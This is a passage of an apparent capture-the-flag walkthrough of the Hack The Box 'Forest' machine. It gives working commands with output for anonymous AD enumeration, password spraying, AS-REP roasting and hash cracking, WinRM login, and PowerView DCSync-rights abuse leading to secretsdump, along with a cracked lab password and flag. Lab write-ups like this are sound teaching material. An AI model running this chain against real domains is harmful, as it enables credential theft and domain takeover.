information via SMB\n[*] Enumerating via 'srvinfo'\n[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED\n[+] After merging OS information we have the following result:\nOS: Windows Server 2016 Standard 14393\nOS version: '10.0'\nOS release: '1607'\nOS build: '14393'\nNative OS: Windows Server 2016 Standard 14393\nNative LAN manager: Windows Server 2016 Standard 6.3\nPlatform id: null\nServer type: null\nServer type string: null\n\n ===================================\n|    Users via RPC on forest.htb    |\n ===================================\n[*] Enumerating users via 'querydispinfo'\n[+] Found 31 user(s) via 'querydispinfo'\n[*] Enumerating users via 'enumdomusers'\n[+] Found 31 user(s) via 'enumdomusers'\n[+] After merging user results we have 31 user(s) total:\n'1123':\n  username: $331000-VK4ADACQNUCA\n  name: (null)\n  acb: '0x00020015'\n  description: (null)\n'1124':\n  username: SM_2c8eef0a09b545acb\n  name: Microsoft Exchange Approval Assistant\n  acb: '0x00020011'\n  description: (null)\n'1125':\n  username: SM_ca8c2ed5bdab4dc9b\n  name: Microsoft Exchange\n  acb: '0x00020011'\n  description: (null)\n'1126':\n  username: SM_75a538d3025e4db9a\n  name: Microsoft Exchange\n  acb: '0x00020011'\n  description: (null)\n'1127':\n  username: SM_681f53d4942840e18\n  name: Discovery Search Mailbox\n  acb: '0x00020011'\n  description: (null)\n'1128':\n  username: SM_1b41c9286325456bb\n  name: Microsoft Exchange Migration\n  acb: '0x00020011'\n  description: (null)\n'1129':\n  username: SM_9b69f1b9d2cc45549\n  name: Microsoft Exchange Federation Mailbox\n  acb: '0x00020011'\n  description: (null)\n'1130':\n  username: SM_7c96b981967141ebb\n  name: E4E Encryption Store - Active\n  acb: '0x00020011'\n  description: (null)\n'1131':\n  username: SM_c75ee099d0a64c91b\n  name: Microsoft Exchange\n  acb: '0x00020011'\n  description: (null)\n'1132':\n  username: SM_1ffab36a2f5f479cb\n  name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\n  acb: '0x00020011'\n  description: (null)\n'1134':\n  username: HealthMailboxc3d7722\n  name: HealthMailbox-EXCH01-Mailbox-Database-1118319013\n  acb: '0x00000210'\n  description: (null)\n'1135':\n  username: HealthMailboxfc9daad\n  name: HealthMailbox-EXCH01-001\n  acb: '0x00000210'\n  description: (null)\n'1136':\n  username: HealthMailboxc0a90c9\n  name: HealthMailbox-EXCH01-002\n  acb: '0x00000210'\n  description: (null)\n'1137':\n  username: HealthMailbox670628e\n  name: HealthMailbox-EXCH01-003\n  acb: '0x00000210'\n  description: (null)\n'1138':\n  username: HealthMailbox968e74d\n  name: HealthMailbox-EXCH01-004\n  acb: '0x00000210'\n  description: (null)\n'1139':\n  username: HealthMailbox6ded678\n  name: HealthMailbox-EXCH01-005\n  acb: '0x00000210'\n  description: (null)\n'1140':\n  username: HealthMailbox83d6781\n  name: HealthMailbox-EXCH01-006\n  acb: '0x00000210'\n  description: (null)\n'1141':\n  username: HealthMailboxfd87238\n  name: HealthMailbox-EXCH01-007\n  acb: '0x00000210'\n  description: (null)\n'1142':\n  username: HealthMailboxb01ac64\n  name: HealthMailbox-EXCH01-008\n  acb: '0x00000210'\n  description: (null)\n'1143':\n  username: HealthMailbox7108a4e\n  name: HealthMailbox-EXCH01-009\n  acb: '0x00000210'\n  description: (null)\n'1144':\n  username: HealthMailbox0659cc1\n  name: HealthMailbox-EXCH01-010\n  acb: '0x00000210'\n  description: (null)\n'1145':\n  username: sebastien\n  name: Sebastien Caron\n  acb: '0x00000210'\n  description: (null)\n'1146':\n  username: lucinda\n  name: Lucinda Berger\n  acb: '0x00000210'\n  description: (null)\n'1147':\n  username: svc-alfresco\n  name: svc-alfresco\n  acb: '0x00010210'\n  description: (null)\n'1150':\n  username: andy\n  name: Andy Hislip\n  acb: '0x00000210'\n  description: (null)\n'1151':\n  username: mark\n  name: Mark Brandt\n  acb: '0x00000210'\n  description: (null)\n'1152':\n  username: santi\n  name: Santi Rodriguez\n  acb: '0x00000210'\n  description: (null)\n'500':\n  username: Administrator\n  name: Administrator\n  acb: '0x00000010'\n  description: Built-in account for administering the computer/domain\n'501':\n  username: Guest\n  name: (null)\n  acb: '0x00000215'\n  description: Built-in account for guest access to the computer/domain\n'502':\n  username: krbtgt\n  name: (null)\n  acb: '0x00000011'\n  description: Key Distribution Center Service Account\n'503':\n  username: DefaultAccount\n  name: (null)\n  acb: '0x00000215'\n  description: A user account managed by the system.\n\n ====================================\n|    Groups via RPC on forest.htb    |\n ====================================\n[*] Enumerating local groups\n[+] Found 5 group(s) via 'enumalsgroups domain'\n[*] Enumerating builtin groups\n[+] Found 29 group(s) via 'enumalsgroups builtin'\n[*] Enumerating domain groups\n[+] Found 38 group(s) via 'enumdomgroups'\n[+] After merging groups results we have 72 group(s) total:\n'1101':\n  groupname: DnsAdmins\n  type: local\n'1102':\n  groupname: DnsUpdateProxy\n  type: domain\n'1104':\n  groupname: Organization Management\n  type: domain\n'1105':\n  groupname: Recipient Management\n  type: domain\n'1106':\n  groupname: View-Only Organization Management\n  type: domain\n'1107':\n  groupname: Public Folder Management\n  type: domain\n'1108':\n  groupname: UM Management\n  type: domain\n'1109':\n  groupname: Help Desk\n  type: domain\n'1110':\n  groupname: Records Management\n  type: domain\n'1111':\n  groupname: Discovery Management\n  type: domain\n'1112':\n  groupname: Server Management\n  type: domain\n'1113':\n  groupname: Delegated Setup\n  type: domain\n'1114':\n  groupname: Hygiene Management\n  type: domain\n'1115':\n  groupname: Compliance Management\n  type: domain\n'1116':\n  groupname: Security Reader\n  type: domain\n'1117':\n  groupname: Security Administrator\n  type: domain\n'1118':\n  groupname: Exchange Servers\n  type: domain\n'1119':\n  groupname: Exchange Trusted Subsystem\n  type: domain\n'1120':\n  groupname: Managed Availability Servers\n  type: domain\n'1121':\n  groupname: Exchange Windows Permissions\n  type: domain\n'1122':\n  groupname: ExchangeLegacyInterop\n  type: domain\n'1133':\n  groupname: $D31000-NSEL5BRJ63V7\n  type: domain\n'1148':\n  groupname: Service Accounts\n  type: domain\n'1149':\n  groupname: Privileged IT Accounts\n  type: domain\n'498':\n  groupname: Enterprise Read-only Domain Controllers\n  type: domain\n'5101':\n  groupname: test\n  type: domain\n'512':\n  groupname: Domain Admins\n  type: domain\n'513':\n  groupname: Domain Users\n  type: domain\n'514':\n  groupname: Domain Guests\n  type: domain\n'515':\n  groupname: Domain Computers\n  type: domain\n'516':\n  groupname: Domain Controllers\n  type: domain\n'517':\n  groupname: Cert Publishers\n  type: local\n'518':\n  groupname: Schema Admins\n  type: domain\n'519':\n  groupname: Enterprise Admins\n  type: domain\n'520':\n  groupname: Group Policy Creator Owners\n  type: domain\n'521':\n  groupname: Read-only Domain Controllers\n  type: domain\n'522':\n  groupname: Cloneable Domain Controllers\n  type: domain\n'525':\n  groupname: Protected Users\n  type: domain\n'526':\n  groupname: Key Admins\n  type: domain\n'527':\n  groupname: Enterprise Key Admins\n  type: domain\n'544':\n  groupname: Administrators\n  type: builtin\n'545':\n  groupname: Users\n  type: builtin\n'546':\n  groupname: Guests\n  type: builtin\n'548':\n  groupname: Account Operators\n  type: builtin\n'549':\n  groupname: Server Operators\n  type: builtin\n'550':\n  groupname: Print Operators\n  type: builtin\n'551':\n  groupname: Backup Operators\n  type: builtin\n'552':\n  groupname: Replicator\n  type: builtin\n'553':\n  groupname: RAS and IAS Servers\n  type: local\n'554':\n  groupname: Pre-Windows 2000 Compatible Access\n  type: builtin\n'555':\n  groupname: Remote Desktop Users\n  type: builtin\n'556':\n  groupname: Network Configuration Operators\n  type: builtin\n'557':\n  groupname: Incoming Forest Trust Builders\n  type: builtin\n'558':\n  groupname: Performance Monitor Users\n  type: builtin\n'559':\n  groupname: Performance Log Users\n  type: builtin\n'560':\n  groupname: Windows Authorization Access Group\n  type: builtin\n'561':\n  groupname: Terminal Server License Servers\n  type: builtin\n'562':\n  groupname: Distributed COM Users\n  type: builtin\n'568':\n  groupname: IIS_IUSRS\n  type: builtin\n'569':\n  groupname: Cryptographic Operators\n  type: builtin\n'571':\n  groupname: Allowed RODC Password Replication Group\n  type: local\n'572':\n  groupname: Denied RODC Password Replication Group\n  type: local\n'573':\n  groupname: Event Log Readers\n  type: builtin\n'574':\n  groupname: Certificate Service DCOM Access\n  type: builtin\n'575':\n  groupname: RDS Remote Access Servers\n  type: builtin\n'576':\n  groupname: RDS Endpoint Servers\n  type: builtin\n'577':\n  groupname: RDS Management Servers\n  type: builtin\n'578':\n  groupname: Hyper-V Administrators\n  type: builtin\n'579':\n  groupname: Access Control Assistance Operators\n  type: builtin\n'580':\n  groupname: Remote Management Users\n  type: builtin\n'581':\n  groupname: System Managed Accounts Group\n  type: builtin\n'582':\n  groupname: Storage Replica Administrators\n  type: builtin\n\n ====================================\n|    Shares via RPC on forest.htb    |\n ====================================\n[*] Enumerating shares\n[+] Found 0 share(s) for user '' with password '', try a different user\n\n =======================================\n|    Policies via RPC for forest.htb    |\n =======================================\n[*] Trying port 445/tcp\n[+] Found policy:\nDomain password information:\n  Password history length: 24\n  Minimum password length: 7\n  Maximum password age: not set\n  Password properties:\n  - DOMAIN_PASSWORD_COMPLEX: false\n  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false\n  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false\n  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false\n  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false\n  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false\nDomain lockout information:\n  Lockout observation window: 30 minutes\n  Lockout duration: 30 minutes\n  Lockout threshold: None\nDomain logoff information:\n  Force logoff time: not set\n\n =======================================\n|    Printers via RPC for forest.htb    |\n =======================================\n[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED\n\nCompleted after 21.36 seconds\n</code></pre> Good amount of information above, we'll keep that in mind because we can enumerate ldap too and we might revisit smb &amp; rpc later.</p>"},{"location":"ch3ckm8_HTB_forest/#ldap-enumeration","title":"LDAP enumeration","text":"<p>Get naming context: <pre><code>ldapsearch -LLL -x -H ldap://forest.htb -s base namingcontexts\n</code></pre></p> <pre><code>dn:\nnamingContexts: DC=htb,DC=local\nnamingContexts: CN=Configuration,DC=htb,DC=local\nnamingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local\nnamingContexts: DC=DomainDnsZones,DC=htb,DC=local\nnamingContexts: DC=ForestDnsZones,DC=htb,DC=local\n</code></pre> <p>Get all the users using ldapsearch and save them in a txt file: <pre><code>ldapsearch -LLL -x -H ldap://forest.htb -b \"DC=htb,DC=local\" \"objectclass=user\" | egrep -i ^samaccountname | awk -F ': ' '{print $2}' | tee users.txt\n</code></pre></p> <p><pre><code>Guest\nDefaultAccount\nFOREST$\nEXCH01$\n$331000-VK4ADACQNUCA\nSM_2c8eef0a09b545acb\nSM_ca8c2ed5bdab4dc9b\nSM_75a538d3025e4db9a\nSM_681f53d4942840e18\nSM_1b41c9286325456bb\nSM_9b69f1b9d2cc45549\nSM_7c96b981967141ebb\nSM_c75ee099d0a64c91b\nSM_1ffab36a2f5f479cb\nHealthMailboxc3d7722\nHealthMailboxfc9daad\nHealthMailboxc0a90c9\nHealthMailbox670628e\nHealthMailbox968e74d\nHealthMailbox6ded678\nHealthMailbox83d6781\nHealthMailboxfd87238\nHealthMailboxb01ac64\nHealthMailbox7108a4e\nHealthMailbox0659cc1\nsebastien\nlucinda\nandy\nmark\nsanti\n</code></pre> keep this for later (possibly for bruteforce, pass spraying etc)</p>"},{"location":"ch3ckm8_HTB_forest/#anonymous-ldap-enumeration","title":"Anonymous LDAP Enumeration","text":"<p><pre><code>ldapsearch -LLL -x -H ldap://forest.htb -b \"DC=htb,DC=local\"\n</code></pre> Here i found that <code>DONT_REQ_PREAUTH</code> flag is set! lets keep that in mind for later, and move on.</p>"},{"location":"ch3ckm8_HTB_forest/#enumerate-users-that-can-login-remotely","title":"Enumerate users that can login remotely","text":"<p>We could enumerate even further via ldap queries to find users that can login remotely, using windapsearch: https://github.com/ropnop/windapsearch <pre><code>python windapsearch.py -u \"\" --dc-ip 10.129.95.210 -U -m \"Remote Management Users\"\n</code></pre></p> <pre><code>[+] No username provided. Will try anonymous bind.\n[+] Using Domain Controller at: 10.129.95.210\n[+] Getting defaultNamingContext from Root DSE\n[+] Found: DC=htb,DC=local\n[+] Attempting bind\n[+] ...success! Binded as:\n[+]  None\n[+] Enumerating all AD users\n[+] Found 28 users:\n\ncn: Guest\n\ncn: DefaultAccount\n\ncn: Exchange Online-ApplicationAccount\nuserPrincipalName: Exchange_Online-ApplicationAccount@htb.local\n\ncn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}\nuserPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local\n\ncn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}\nuserPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local\n\ncn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}\nuserPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local\n\ncn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}\nuserPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local\n\ncn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136\nuserPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local\n\ncn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042\nuserPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local\n\ncn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}\nuserPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local\n\ncn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}\nuserPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local\n\ncn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\nuserPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local\n\ncn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe\nuserPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local\n\ncn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50\nuserPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local\n\ncn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5\nuserPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local\n\ncn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8\nuserPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local\n\ncn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba\nuserPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local\n\ncn: HealthMailbox6ded67848a234577a1756e072081d01f\nuserPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local\n\ncn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab\nuserPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local\n\ncn: HealthMailboxfd87238e536e49e08738480d300e3772\nuserPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local\n\ncn: HealthMailboxb01ac647a64648d2a5fa21df27058a24\nuserPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local\n\ncn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf\nuserPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local\n\ncn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e\nuserPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local\n\ncn: Sebastien Caron\nuserPrincipalName: sebastien@htb.local\n\ncn: Lucinda Berger\nuserPrincipalName: lucinda@htb.local\n\ncn: Andy Hislip\nuserPrincipalName: andy@htb.local\n\ncn: Mark Brandt\nuserPrincipalName: mark@htb.local\n\ncn: Santi Rodriguez\nuserPrincipalName: santi@htb.local\n\n[+] Attempting to enumerate full DN for group: Remote Management Users\n[+]  Using DN: CN=Remote Management Users,CN=Builtin,DC=htb,DC=local\n[+]  Found 1 members:\n\nb'CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local'\n\n[*] Bye!\n</code></pre> <p>What we found here, is that <code>Privileged IT Accounts</code> group can remotely login because it is a member of <code>Remote Management Users</code> group, as shown in this snippet of the above output below: <pre><code>[+] Attempting to enumerate full DN for group: Remote Management Users\n[+]  Using DN: CN=Remote Management Users,CN=Builtin,DC=htb,DC=local\n[+]  Found 1 members:\n\nb'CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local'\n</code></pre></p> <p>Lets inspect this group even further (group:[Privileged IT Accounts] rid:[0x47d]) <pre><code>rpcclient $&gt; enumdomgroups\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Domain Controllers] rid:[0x204]\ngroup:[Schema Admins] rid:[0x206]\ngroup:[Enterprise Admins] rid:[0x207]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Read-only Domain Controllers] rid:[0x209]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[Key Admins] rid:[0x20e]\ngroup:[Enterprise Key Admins] rid:[0x20f]\ngroup:[DnsUpdateProxy] rid:[0x44e]\ngroup:[Organization Management] rid:[0x450]\ngroup:[Recipient Management] rid:[0x451]\ngroup:[View-Only Organization Management] rid:[0x452]\ngroup:[Public Folder Management] rid:[0x453]\ngroup:[UM Management] rid:[0x454]\ngroup:[Help Desk] rid:[0x455]\ngroup:[Records Management] rid:[0x456]\ngroup:[Discovery Management] rid:[0x457]\ngroup:[Server Management] rid:[0x458]\ngroup:[Delegated Setup] rid:[0x459]\ngroup:[Hygiene Management] rid:[0x45a]\ngroup:[Compliance Management] rid:[0x45b]\ngroup:[Security Reader] rid:[0x45c]\ngroup:[Security Administrator] rid:[0x45d]\ngroup:[Exchange Servers] rid:[0x45e]\ngroup:[Exchange Trusted Subsystem] rid:[0x45f]\ngroup:[Managed Availability Servers] rid:[0x460]\ngroup:[Exchange Windows Permissions] rid:[0x461]\ngroup:[ExchangeLegacyInterop] rid:[0x462]\ngroup:[$D31000-NSEL5BRJ63V7] rid:[0x46d]\ngroup:[Service Accounts] rid:[0x47c]\ngroup:[Privileged IT Accounts] rid:[0x47d]\ngroup:[test] rid:[0x13ed]\nrpcclient $&gt; querygroup 0x47d\n    Group Name: Privileged IT Accounts\n    Description:    \n    Group Attribute:7\n    Num Members:1\nrpcclient $&gt; querygroupmem 0x47d\n    rid:[0x47c] attr:[0x7]\nrpcclient $&gt; queryuser 0x47c\nresult was NT_STATUS_NO_SUCH_USER\n</code></pre></p> <p>here i assumed that the rid: 0x47c was a user, but it appears its not, it might be a group though: <pre><code>rpcclient $&gt; querygroup 0x47c\n    Group Name: Service Accounts\n    Description:    \n    Group Attribute:7\n    Num Members:1\nrpcclient $&gt; querygroupmem 0x47c\n    rid:[0x47b] attr:[0x7]\nrpcclient $&gt; queryuser 0x47b\n    User Name   :   svc-alfresco\n    Full Name   :   svc-alfresco\n</code></pre> so rid 0x47c corresponds to group <code>Service Accounts</code>, which contains user <code>svc-alfresco</code> so this user can login remotely!</p>"},{"location":"ch3ckm8_HTB_forest/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_forest/#bruteforce","title":"Bruteforce","text":"<p>In case we had more users that could remotely login, we could check if bruteforcing would work here</p>"},{"location":"ch3ckm8_HTB_forest/#password-policy","title":"Password policy","text":"<p>Lets revisit the enum4linux output we did earlier, there we can see the password policy in the following snippet of it's output below: <pre><code> =======================================\n|    Policies via RPC for forest.htb    |\n =======================================\n[*] Trying port 445/tcp\n[+] Found policy:\nDomain password information:\n  Password history length: 24\n  Minimum password length: 7\n  Maximum password age: not set\n  Password properties:\n  - DOMAIN_PASSWORD_COMPLEX: false\n  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false\n  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false\n  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false\n  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false\n  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false\nDomain lockout information:\n  Lockout observation window: 30 minutes\n  Lockout duration: 30 minutes\n  Lockout threshold: None\nDomain logoff information:\n  Force logoff time: not set\n</code></pre> Here Brute-forcing is possible because the domain has no account lockout threshold, meaning unlimited login attempts are allowed without locking out user accounts. Additionally, password complexity is disabled and the minimum password length is only 7 characters, making it easier to guess weak passwords.</p> <p>Since we have the usernames, and according to the password policy no lockouts are present, we can try bruteforcing, first with <code>password same as username</code> <pre><code>nxc smb forest.htb -u users.txt -p users.txt --continue-on-success\n</code></pre> not successful..</p> <p>then lets bruteforce with the rockyou <code>wordlist</code> <pre><code>nxc smb bruteforce forest.htb -u users.txt -p /usr/share/wordlists/rockyou.txt\n</code></pre> not successful..</p> <p>lets try another <code>wordlist</code>: <pre><code>wget &lt;https://raw.githubusercontent.com/insidetrust/statistically-likely-&gt;\nusernames/master/weak-corporate-passwords/english-basic.txt\n\ncrackmapexec smb 10.129.95.210 -d forest -u users.txt -p english-basic.txt\n</code></pre> no luck with this either.. it appears that bruteforce might not be the way to go here... </p>"},{"location":"ch3ckm8_HTB_forest/#as-rep-roasting","title":"AS-REP Roasting","text":""},{"location":"ch3ckm8_HTB_forest/#reminder","title":"Reminder","text":"<p><code>AS-REP Roasting</code>\u00a0targets\u00a0user accounts that do not require Kerberos pre-authentication,\u00a0specifically those with the\u00a0<code>DONT_REQUIRE_PREAUTH</code>\u00a0flag set in Active Directory. That is why we will not specify any password on the command below.</p> <p>If you remember, at the Anonymous LDAP Enumeration section, i have found that there are users that have <code>DONT_REQ_PREAUTH</code> enabled! Which is a requirement to perform <code>AS-REP roasting</code>!!! <pre><code>GetNPUsers.py htb.local/ -no-pass -usersfile user-remote.txt -dc-ip 10.129.95.210\n</code></pre></p> <p><pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies\n\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:daa8803b31320062bdcff3219907b0ad$f6d1e658a8007cef65449557518a5fa9c4df1fbb8f082cb04f0e9ccc1d12e665e159517df9001e47f5daf38c50f4c43a599a30c343ecb8ff5c3064bd74aaa2b6d87fca32c837fd0831f0daf15b4d29cb4349d23e941643427c4d16ff7a09ba6703541370bdefe5c703f2c5a6a9275f58a679499e075a664ce6289ae298bda4b4f48806fb083c7fc3d74aaa0f85e8b1bbba890eac2ca7341e28c718425b423b997ea065c2e8519f6b025012aa4e86d3e8b91c12974109ef57da3ffb833161876739574bb54eb953772a9d9ff55f074346ce374ae4f1214989d488af7cc17a9b33f454bdf81e92\n</code></pre> great! we got an AS-REP hash!</p>"},{"location":"ch3ckm8_HTB_forest/#cracking-the-as-rep-hash","title":"Cracking the AS-REP hash","text":"<p>place the hash as you found it earlier on a txt (hash_forest.txt) and crack it with john the ripper: <pre><code>john hash_forest.txt --wordlist=rockyou.txt\n</code></pre></p> <pre><code>s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)  \n</code></pre> <p>nice! we found the password for user svc-alfresco, the updated creds for future reference are: <pre><code>svc-alfresco\ns3rvice\n</code></pre></p>"},{"location":"ch3ckm8_HTB_forest/#where-can-we-login-with-found-creds","title":"Where can we login with found creds?","text":"<p>lets see where we can now login with those creds, using my script to bulk check automatically multiple services: https://github.com/ch3ckkm8/auto_netexec <pre><code>./auto_netexec_bulk_creds_checker.sh forest.htb 'svc-alfresco' 's3rvice'\n</code></pre></p> <p><pre><code>[*] Checking if winrm port 5985 is open on forest.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)\nWINRM       10.129.95.210   5985   FOREST           [+] htb.local\\\\svc-alfresco:s3rvice (Pwn3d!)\n\n[*] Checking if smb port 445 is open on forest.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)\nSMB         10.129.95.210   445    FOREST           [+] htb.local\\\\svc-alfresco:s3rvice \n\n[*] Checking if ldap port 389 is open on forest.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)\nLDAP        10.129.95.210   389    FOREST           [+] htb.local\\\\svc-alfresco:s3rvice \n\n[*] Checking if rdp port 3389 is open on forest.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on forest.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.95.210   135    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)\nRPC         10.129.95.210   135    FOREST           [+] htb.local\\\\svc-alfresco:s3rvice \n\n[*] Checking if nfs port 2049 is open on forest.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on forest.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on forest.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on forest.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on forest.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> The above output indicates that we can login succesfully via the <code>win-rm</code> service (port 5985) </p>"},{"location":"ch3ckm8_HTB_forest/#logging-in-as-svc-alfresco-with-creds","title":"Logging in as svc-alfresco with creds","text":"<p><pre><code>evil-winrm -i forest.htb -u 'svc-alfresco' -p 's3rvice'\n</code></pre> successful login, grabbed user flag! <code>4078533b1e2413c4977ef33e6701bf89</code></p>"},{"location":"ch3ckm8_HTB_forest/#privesc","title":"Privesc","text":"<p>Since we now have a valid user\u2019s creds, we can try enumerating via bloodhound, to get a better picture of the AD, with a visual representation.</p>"},{"location":"ch3ckm8_HTB_forest/#bloodhound-as-svc-alfresco","title":"Bloodhound as svc-alfresco","text":"<pre><code>bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.129.95.210 -c All --zip\n</code></pre> <p>lets inspect the group memebership for our svc-alfresco </p> <p>it appears that he is member of <code>Account Operators</code>, which has <code>GenericAll</code> rights towards 29 groups!  obviously we should now inspect their outbound control to decide which one we will be targeting.</p> <p>By hitting outbound object control &gt; Transitive object control, we see that <code>Account Operators</code> have the following rights towards these groups:  The most logical path to me seems the one towards group <code>Exchange Windows Permissions</code>, since it has <code>WriteDacl</code> rights towards the <code>domain</code> so i will start from there.</p>"},{"location":"ch3ckm8_HTB_forest/#dacl-abuse","title":"DACL abuse","text":"<p>To sum up, <code>svc-alfresco</code> is member of <code>Account Operators</code>. <code>Account Operators</code> has <code>GenericAll</code> rights towards multiple groups, so <code>svc-alfresco</code> does too. Since <code>Account Operators</code> has <code>GenericAll</code> over <code>EXCHANGE WINDOWS PERMISSIONS</code> group, and this group has <code>WriteDacl</code> rights towards the <code>Domain</code> this would be the path we'll follow.</p>"},{"location":"ch3ckm8_HTB_forest/#add-user-to-group","title":"Add user to group","text":"<p>Before actually abusing DACL, lets add the user to the group. From inside the machine: (be careful to upload the powerview.ps1 that works, from pwnbox i found it in the powersploit tool path)</p> <p>We are going to use <code>PowerView</code> <pre><code># once logged in via win-rm, upload powerview from your local machine \nupload /root/Downloads/dev_PowerSploit/PowerSploit/Recon/PowerView.ps1 .\\\\PowerView.ps1\n\n# import the uploaded powerview script\nImport-Module .\\\\PowerView.ps1\n\n# Define variables for better understanding and value assignement\n$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('htb\\\\svc-alfresco', $SecPassword)\n\n# Add svc-alfresco to EXCHANGE WINDOWS PERMISSIONS group\nAdd-ADGroupMember -Identity \"EXCHANGE WINDOWS PERMISSIONS\" -Members 'svc-alfresco'\n</code></pre></p>"},{"location":"ch3ckm8_HTB_forest/#grant-dcsync-rights-to-user","title":"Grant DCSync rights to user","text":"<p>Granting <code>DCSync</code> rights to user svc-alfresco using <code>PowerView</code> <pre><code>Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -Rights DCSync -Verbose -PrincipalIdentity 'htb\\\\svc-alfresco' -credential $Cred \n</code></pre></p>"},{"location":"ch3ckm8_HTB_forest/#dump-secrets","title":"Dump secrets","text":"<p>Next, now that <code>svc-alfresco</code> has gained <code>DCSync</code> rights, we can run <code>secretdump</code> remotely from our host: <pre><code>secretsdump.py svc-alfresco:s3rvice@10.129.95.210 -dc-ip 10.129.95.210\n</code></pre></p> <p><pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\\\uid:rid:lmhash:nthash)\n[*] Using the 